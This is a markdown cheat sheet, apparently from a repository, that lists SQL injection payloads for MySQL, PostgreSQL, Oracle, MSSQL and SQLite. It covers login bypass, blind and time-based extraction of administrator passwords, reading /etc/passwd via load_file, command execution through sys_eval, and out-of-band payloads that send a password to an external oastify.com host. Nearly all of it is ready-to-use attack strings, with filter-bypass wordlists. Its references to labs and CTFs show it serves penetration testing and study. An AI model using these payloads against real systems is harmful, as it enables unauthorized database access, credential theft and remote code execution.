# SQL Injection Payloads

## Index

1. [Initial Testing](#initial-testing)
2. [Determining SQLi Vulnerability & Login Bypass](#determining-sqli-vulnerability--login-bypass)
3. [Determining Column Numbers](#determining-column-numbers)
4. [To Find a Column Containing Strings](#to-find-a-column-containing-strings)
5. [To Identify Vulnerable Columns](#to-identify-vulnerable-columns)
6. [Data Retrieval](#data-retrieval)
7. [To Fetch Database Version](#to-fetch-database-version)
8. [MySQL Database Info Retrieving](#mysql-database-info-retrieving)
9. [PostgreSQL Database Info Retrieving](#postgresql-database-info-retrieving)
10. [Oracle Database Info Retrieving](#oracle-database-info-retrieving)
11. [SQLite Database Info Retrieving](#sqlite-database-info-retrieving)
12. [String Concatenation](#string-concatenation)
13. [Blind-Based Boolean SQL Injection with Conditional Responses (Visible Message)](#blind-based-boolean-sql-injection-with-conditional-responses-visible-message)
14. [Blind SQL Injection with Conditional Errors (No Visible Message)](#blind-sql-injection-with-conditional-errors-no-visible-message)
15. [Blind SQL Injection with Conditional Errors to Determine Table, Other Info Exist or Not](#blind-sql-injection-with-conditional-errors-to-determine-table-other-info-exist-or-not)
16. [Blind SQL Injection with Time Delays](#blind-sql-injection-with-time-delays)
17. [Blind SQL Injection with Time Delays and Information Retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
18. [Parameter Testing for Time-Based Blind SQL Injection](#parameter-testing-for-time-based-blind-sql-injection)
19. [Cookie Testing](#cookie-testing)
20. [Visible Error-Based SQL Injection](#visible-error-based-sql-injection)
21. [HTTP Header Based SQL Injection](#http-header-based-sql-injection)
22. [Inception Based SQL Injection](#inception-based-sql-injection)
23. [Out of band interaction](#out-of-band-interaction)
24. [SQL Injection with LOAD_FILE and INTO OUTFILE](#sql-injection-with-load_file-and-into-outfile)
25. [Exceptional Payloads](#exceptional-payloads)
26. [XML based filter bypass via XML encoding](#XML-based-filter-bypass-via-XML-encoding)
27. [Wordlist](#wordlist)
28. [Filter bypass using appending](#Filter-bypass-using-appending)
29. [CTF](#ctf)
___

### External Links for SQLi Techniques

    https://portswigger.net/web-security/sql-injection/cheat-sheet
    https://tryhackme.com/r/room/advancedsqlinjection
___
## Initial Testing
```
'
"
')
")
' sleep(15)
' or sleep(15)-- -
'; sleep(15)
1'%0A||%0A1=1%0A--'-
1'%0a%7c%7c%0asleep(7.5)%0a--'-
```

## SQL Injection with LOAD_FILE and INTO OUTFILE
```
' and 1=2 union all select concat_ws(0x3a,version(),user(),database())--

' and 1=2 union all select load_file('/etc/passwd')--

' and 1=2 union all select 'blablabla_bug_bounty_program' into outfile '/tmp/blablabla'--

```
Source: https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2
### Examples
```sql

AND 1=CONVERT(int, (SELECT @@version))

X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers ✔

X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1 ✔

&topsort=flowers or sleep(3) >> Url Parameter

/etc/example?term=')+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)+AND+(1=' >> Url Parameter with (X-Requested-With: XMLHttpRequest) header.

&location=(select*from(select(sleep(3)))a) >> Cookie

&direction=desc,(select*from(select(sleep(3)))a)& >> Cookie

"accid":"25 and sleep(3)#" >> In json data

<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> >> In xml data with encoding

&log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd= >> Post data

&comment_id=291751-sleep(5)& >>

filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File

asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerability

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

'; IF (1=1) WAITFOR DELAY '0:0:10'--

-1337 union select "main.py" >> To fetch arbitrary file.

id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; >> To manipulate database filename.

' union select 1,2,3,4,5 from --table_name-- - >> Union based table name retrieving.
```
### Exceptional Payloads
```txt
-1047 OR CASE WHEN 6810=6810 THEN 6810 ELSE JSON(CHAR(98,79,78,79)) END
%' AND 7395=7395 AND 'gyZA%'='gyZA
%' AND (SELECT 9598 FROM (SELECT(SLEEP(5)))bJqR) AND 'FKXA%'='FKXA
%' UNION ALL SELECT 1,2,3,CONCAT(0x716b7a7a71,0x6a4a7143494e46596b6d4c4c6569725a475572687178746d55434b687861796371705952614c7857,0x7176786271),NULL-- -
```
### Data retrieval
```
' or 1=1-- -

' or 'a'='a

' union select 1,2,3,4,5 -- -

' union select 1,2,3,table_schema,table_name from information_schema.tables -- - >> To fetch database name with table name

' union select 1,2,column_name,null,null from information_schema.columns where table_schema = 'database_name' and table_name = 'table_name' -- - >> To fetch column name from specific table

' union select 1,2,username,password,null from database_name.table_name -- >> To fetch info from specific column

' union select 1,2,3,4,sys_eval('whoami')-- - >> SQLi to RCE. sys_exec('touch hacked.txt')

natas16" AND BINARY SUBSTRING(password,§1§,1)="A" # >> Bruteforce password
```
### Determining SQLi Vulnerability & Login Bypass
```sql
1 || 1=1-- -
1 or 1=1-- -
1' or 1=1-- -
1' or 'abc'='abc'-- -
1') or 1=1-- -
1' or 1=1-- -%00
' or '1'='1
1' or 1=1;-- -
' union select "pass" as password from <db_name> where '1'='1
```
### Parameter Testing for Time-Based Blind SQL Injection
```sql
or sleep(5)

(select*from(select(sleep(5)))a)

0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z

1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH

(select*from(select(sleep(3)))a)

(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END))
```
### Cookie testing 
```sql
' and 1=1-- - >> Conditional response (Boolean)

' || (select ' ') || ' >> Conditional error

' ||  (SELECT SLEEP(10))-- - >> Time delays

(select*from(select(sleep(3)))a)
```
### Determining column numbers
```sql

' order by 1-- -

' union select null, null from dual-- - >> Oracle

' union select null, null-- - >> Non Oracle

union select null, null >> Without quote in vulnerable parameter

and 1=2 union select null, null >> Without quote in vulnerable parameter
```
### To find a column containing strings
```sql
' union select null, 'null', null-- -
```
### To fetch database version
```sql
' union select banner, null from v$version-- - >> Oracle

' union select null, @@version-- - >> Mysql, MSsql

' union select null, version()-- - >> PostgreSQL

' union select null, sqlite_version()-- - >> SQLite
```

### To identify vulnerable columns
```sql
' union select 1,2,3,4-- -

union select 1,2,3,4 >> Without quote in vulnerable parameter

and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
```
### String concatenation
```sql
Oracle 	'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL 	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')
```

### SQLite Database info retrieving
```sql
(SELECT group_concat(tbl_name) FROM sqlite_master)

(SELECT sql FROM sqlite_master WHERE name ='[table name here]') >> To retrieve data from one table.

(SELECT sql FROM sqlite_master) >> Useful to retrieve all table and column in a single payload.

(SELECT group_concat([column name here]) from [table name here])

(SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
```

### Oracle Database info retrieving
```sql
' union SELECT table_name,null FROM all_tables-- -

' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 

' union select [column name here],null from [table name here]-- - 
```

### PostgreSQL Database info retrieving
```sql
' union SELECT table_name,null FROM information_schema.tables-- -

' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -

' union select [column name here],null from [table name here]-- -

' union select 1, column1 || colum2 from [database name here]-- -

'||(select column1 from [table name here] limit 1)-- - >> Visible error based sqli in cookie value.

'||cast((select column1 from [table name here] LIMIT 1) AS INT)-- >> Visible error based sqli in cookie value.

' union select null, (SELECT string_agg(username || ':' || password, ', ') FROM users)-- - Retrieving multiple values in a single column
```

### Mysql Database info retrieving
```sql
' union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]'

' union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

' union select null,null,[column name here],null from [table name here]

and 1=2 union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]' >> Without qoute in vulnerable parameter

and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

and 1=2 union select null,null,[column name here],null from [table name here]
```

### Blind based Boolean SQL injection with conditional responses (Visible message)
```sql
' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.

' and (select username from users where username='administrator')='administrator'-- - >> To determine the username

' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -

' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -

' or LENGTH(username)<=7
```

### Blind SQL injection with conditional errors (No visible message)
```sql
' || (select ' ') || ' >> Non Oracle

' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
```

### Blind SQL Injection with Conditional Errors to Determine Table, Other Info Exist or Not
```sql
' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.
```

### Blind SQL injection with time delays
```sql
' UNION SELECT SLEEP(5);-- -

' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle

' || (WAITFOR DELAY '0:0:10')-- - >> Microsoft

' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL

' ||  (SELECT SLEEP(10))-- - >> MySQL
```

### Blind SQL injection with time delays and information retrieval
```sql
1) PostrgreSQL

' || (select case when (1=1) then pg_sleep(10 ) else pg_sleep (-1) end)-- -

' || (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- - or, ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users-- -

' || (select case when (username='[username here]') then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- -

' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -

x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>3) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$1$,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
```

### Visible Error-Based Sql Injection
```sql
'||cast((select version() LIMIT 1) AS INT)--

'||cast((select username from users LIMIT 1) AS INT)--  >> cast for PostgreSQL

'||cast((select password from users LIMIT 1) AS INT)--
```

### HTTP Header Based SQL Injection
```sql
x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
```

### Inception Based SQL Injection
```sql
and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
```
### Wordlist
```sql
    or sleep 5 —
    or sleep 5
    or sleep(5) —
    or sleep(5)

    or SELECT pg_sleep(5);
    (SELECT pg_sleep(5))
    pg_sleep(5) —
    1 or pg_sleep(5) —
    “ or pg_sleep(5) —
    ‘ or pg_sleep(5) —
    1) or pg_sleep(5) —

    ;waitfor delay ‘0:0:5’ —
    ‘;WAITFOR DELAY ‘0:0:5’ —
    );waitfor delay ‘0:0:5’ —
    ‘;waitfor delay ‘0:0:5’ —
    “;waitfor delay ‘0:0:5’ —
    ‘);waitfor delay ‘0:0:5’ —
    “);waitfor delay ‘0:0:5’ —
    ));waitfor delay ‘0:0:5’ —
    ‘));waitfor delay ‘0:0:5’ —
    “));waitfor delay ‘0:0:5’ —
    “) IF (1=1) WAITFOR DELAY ‘0:0:5’ —
    ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
    ‘ WAITFOR DELAY ‘0:0:5’ —
```
**Routed SQL Injection POC:** [Click](https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk)

### Out of band interaction
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://s4xxbrj7yq5ncirvu0461nop2g87w7kw.oastify.com/"> %remote;]>'),'/l') FROM dual--
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.otlt0n83nmuj1egrjwt2qjdlrcx3lufi4.oastify.com/"> %remote;]>'),'/l') FROM dual-- >> For retrieve data
```

## XML based filter bypass via XML encoding

![Screenshot From 2025-05-10 18-01-10](https://github.com/user-attachments/assets/764a7870-b62b-4800-9826-8050dd3fd9b8)

**Portswigger Academy Lab:** [Click](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## Filter Bypass Using Appending 

In a CTF challenge, we found an input filtering mechanism with the following filters:  

**Filters:** `or`, `and`, `true`, `false`, `union`, `like`, `=`, `>`, `<`, `;`, `--`, `/* */`, `admin`.  

To bypass this filter, we tried the following payload:  

![Screenshot From 2025-03-28 04-53-04](https://github.com/user-attachments/assets/a29a68ab-4436-4552-abbf-5e91fde6c90a)  

## CTF
```
'or 1=1-- -
admin'-- -
admin'/*
ad'||'min'/*
' order by 1-- -
' union select 1,2,3,4-- -
```
 

